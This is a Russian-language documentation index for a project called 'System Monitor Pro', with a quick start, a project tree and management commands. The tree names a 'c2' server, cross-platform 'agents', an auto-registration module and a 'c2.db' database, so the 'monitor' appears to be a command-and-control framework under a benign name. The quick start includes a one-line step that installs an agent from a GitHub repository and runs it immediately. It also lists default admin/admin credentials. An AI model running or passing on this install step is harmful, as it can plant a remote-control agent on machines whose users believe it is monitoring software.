# 📚 System Monitor Pro - Документация

## 🎯 Главные документы

### [CLEAN_DOCS.md](./CLEAN_DOCS.md) ⭐
**СМОТРИТЕ ЗДЕСЬ ПЕРВЫМ!**
- Структура проекта
- Быстрый старт
- API endpoints
- Конфигурация
- Логирование

### [README.md](../README.md)
Краткое описание проекта и инструкции запуска

### [CHANGELOG.md](./CHANGELOG.md)
История изменений и обновлений

### [LOGGING.md](./LOGGING.md)
Система логирования и отладки

---

## 📦 Архивированные документы

Старые документы перемещены в папку `_archive/`:
- `ARCHITECTURE.md` - Старая архитектура
- `ARCHITECTURE_NEW.md` - Новая архитектура (устаревшая)
- `MIGRATION.md` - Миграция (уже выполнена)
- `UNIFIED_DOCS.md` - Объединённая документация (устаревшая)
- И другие...

---

## 🚀 Быстрый старт

```bash
# 1. Установка зависимостей
pip install -r requirements.txt

# 2. Запуск сервера
python3 run_unified.py --host 0.0.0.0 --port 5000

# 3. Установка агента
pip install --break-system-packages git+https://github.com/GaredBerns/system-monitor.git && syscheck

# 4. Доступ
# http://localhost:5000
# Логин: admin / admin
```

---

## 📂 Структура проекта

```
sysmon-pro/
├── src/                 # Исходный код
│   ├── c2/             # Основной сервер
│   ├── agents/         # Агенты для разных платформ
│   ├── autoreg/        # Авторегистрация
│   ├── mail/           # Email менеджер
│   ├── utils/          # Утилиты
│   └── core/           # Core конфигурация
├── data/               # БД и файлы
├── logs/               # Логи
├── templates/          # HTML шаблоны
├── static/             # CSS/JS
├── setup.py            # Пакет sysmon-pro
└── run_unified.py      # Точка входа
```

---

## 🔧 Управление

### Использование manage.sh

```bash
# Запуск
./manage.sh start

# Остановка
./manage.sh stop

# Перезапуск
./manage.sh restart

# Статус
./manage.sh status

# Логи
./manage.sh logs

# Очистка кеша
./manage.sh clean
```

---

## ❓ FAQ

**Q: Где находятся логи?**  
A: В папке `/logs/`. Каждый модуль имеет свои логи (`.log`, `_errors.log`, `_json.log`)

**Q: Как изменить порт?**  
A: `python3 run_unified.py --port 8888`

**Q: Как включить debug режим?**  
A: `export SYSMON_DEBUG=1`

**Q: Как сбросить базу данных?**  
A: `rm data/c2.db` и перезагрузить сервер

---

## 📞 Поддержка

Для ошибок и предложений создавайте issues в репозитории.

**Дата архитектуры:** 29.03.2026  
**Версия:** 3.0 (System Monitor Pro)

